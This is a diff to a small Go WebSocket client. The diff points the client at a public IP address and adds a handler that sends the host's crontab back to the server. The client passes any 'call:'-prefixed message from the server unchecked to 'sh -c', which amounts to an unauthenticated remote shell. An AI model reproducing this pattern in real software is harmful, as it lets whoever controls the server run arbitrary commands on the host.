@@ -11,7 +11,7 @@ import (
 )
 
 var (
-  locate = "localhost/test"
+  locate = "54.173.221.236/test"
   origin = "http://" + locate
   ws_url = "ws://" + locate + "/ws"
 )
@@ -56,11 +56,16 @@ func receiveMsg(ws *websocket.Conn) {
   for err := websocket.Message.Receive(ws, &msg); err == nil; err = websocket.Message.Receive(ws, &msg) {
     //var keyph=`call`
     r := regexp.MustCompile(`call:`)
+    t := regexp.MustCompile(`cls`)
     if(r.MatchString(msg)==true){
       msg = r.ReplaceAllString(msg, "")
       callScript(msg)
-    } else {
-    fmt.Printf("Receive data=%#v\n", msg)
+    } else if(t.MatchString(msg)==true){
+      ls, err := exec.Command("sh","-c","crontab -l").Output()
+      if err != nil{
+          fmt.Printf("%#v\n",err)
+        }
+      sendMsg(ws, string(ls));
     }
   }
   defer log.Printf("End Receiving.\n")
@@ -80,6 +85,6 @@ func receiveMsg(ws *websocket.Conn) {
 func callScript(msg string){
   err := exec.Command("sh","-c",msg).Run()
   if err != nil {
-    fmt.Printf("%#vなどというファイルはないです\n", msg)
+    fmt.Printf("%#v\n", err)
   }
 }
